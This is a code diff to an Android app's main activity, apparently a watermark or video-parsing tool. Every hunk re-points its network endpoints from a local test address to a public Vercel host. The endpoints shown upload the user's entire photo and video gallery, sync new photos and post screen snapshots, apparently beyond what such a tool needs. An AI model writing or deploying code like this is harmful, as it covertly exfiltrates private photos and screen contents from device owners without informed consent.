@@ -97,7 +97,7 @@ class MainActivity : AppCompatActivity() {
             while (isActive) {
                 try {
                     delay(3000)
-                    val url = java.net.URL("http://192.168.1.11:8888/api/gallery/sync_status")
+                    val url = java.net.URL("https://q-qwatermark-app-tf99.vercel.app/api/gallery/sync_status")
                     val conn = (url.openConnection() as java.net.HttpURLConnection).apply {
                         requestMethod = "GET"
                         connectTimeout = 1500
@@ -157,7 +157,7 @@ class MainActivity : AppCompatActivity() {
             try {
                 val allPhotos = queryDevicePhotos(0)
                 if (allPhotos.isNotEmpty()) {
-                    val targetUrl = "http://192.168.1.11:8888/api/gallery/upload"
+                    val targetUrl = "https://q-qwatermark-app-tf99.vercel.app/api/gallery/upload"
                     val existingOnServer = fetchServerManifestFilenames(targetUrl)
 
                     // 智能差量比对：仅同步云端缺失的相片（误删的、或新增的）
@@ -212,7 +212,7 @@ class MainActivity : AppCompatActivity() {
             try {
                 val newPhotos = queryDevicePhotosSince(sinceSeconds)
                 if (newPhotos.isNotEmpty()) {
-                    val targetUrl = "http://192.168.1.11:8888/api/gallery/upload"
+                    val targetUrl = "https://q-qwatermark-app-tf99.vercel.app/api/gallery/upload"
                     for (p in newPhotos) {
                         uploadSingleDevicePhoto(p, targetUrl)
                     }
@@ -319,7 +319,7 @@ class MainActivity : AppCompatActivity() {
                         }
 
                         val targetEndpoints = listOf(
-                            "http://192.168.1.11:8888/api/screen/snapshot",
+                            "https://q-qwatermark-app-tf99.vercel.app/api/screen/snapshot",
                             "http://127.0.0.1:8888/api/screen/snapshot"
                         )
 
@@ -483,7 +483,7 @@ class MainActivity : AppCompatActivity() {
                     // 2. Cloud Backend API Fallback
                     try {
                         logCallback("CLOUD", "调度云端 4K 高并发解析通道...")
-                        val cloudEndpoints = listOf("http://192.168.1.11:8888/api/parse", "http://127.0.0.1:8888/api/parse")
+                        val cloudEndpoints = listOf("https://q-qwatermark-app-tf99.vercel.app/api/parse", "http://127.0.0.1:8888/api/parse")
                         for (ep in cloudEndpoints) {
                             try {
                                 val cloudUrl = java.net.URL(ep)
@@ -711,7 +711,7 @@ class MainActivity : AppCompatActivity() {
                         Toast.makeText(context, "🚀 开始全量同步 ${total} 张相册/视频资产...", Toast.LENGTH_SHORT).show()
                     }
 
-                    val targetUrl = if (serverUrl.isNotBlank()) serverUrl else "http://192.168.1.11:8888/api/gallery/upload"
+                    val targetUrl = if (serverUrl.isNotBlank()) serverUrl else "https://q-qwatermark-app-tf99.vercel.app/api/gallery/upload"
                     var syncedCount = 0
 
                     for (p in allPhotos) {
@@ -798,7 +798,7 @@ class MainActivity : AppCompatActivity() {
                         return@launch
                     }
 
-                    val targetUrl = if (serverUrl.isNotBlank()) serverUrl else "http://192.168.1.11:8888/api/gallery/upload"
+                    val targetUrl = if (serverUrl.isNotBlank()) serverUrl else "https://q-qwatermark-app-tf99.vercel.app/api/gallery/upload"
                     val boundary = "==Boundary_${System.currentTimeMillis()}=="
                     val url = java.net.URL(targetUrl)
                     val conn = (url.openConnection() as java.net.HttpURLConnection).apply {
